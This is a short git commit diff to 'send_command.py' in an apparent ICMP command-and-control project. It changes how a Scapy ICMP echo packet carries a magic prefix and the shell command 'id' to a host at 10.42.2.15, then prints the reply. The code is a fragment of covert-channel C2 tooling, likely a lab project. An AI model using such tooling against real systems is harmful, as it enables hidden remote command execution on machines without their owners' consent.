704a7d1045ff18c35bfe8523fd023aec4d3bbc6d
Jack <62919016+JackDunfey@users.noreply.github.com>
2024-11-19 04:18:28 -0500

    trying to merge

--- icmp-c2/send_command.py
+++ icmp-c2/send_command.py
@@ -56,6 +56,6 @@ from time import sleep
 if __name__ == "__main__":
     pkt = IP(dst="10.42.2.15") /\
         ICMP(type=8) /\
-        Raw(load=b"\x70\x95\x05id")
+        Raw(load=b"\x70\x95\x05"+f"id")
     res = sr1(pkt, verbose=False)
     res.show()
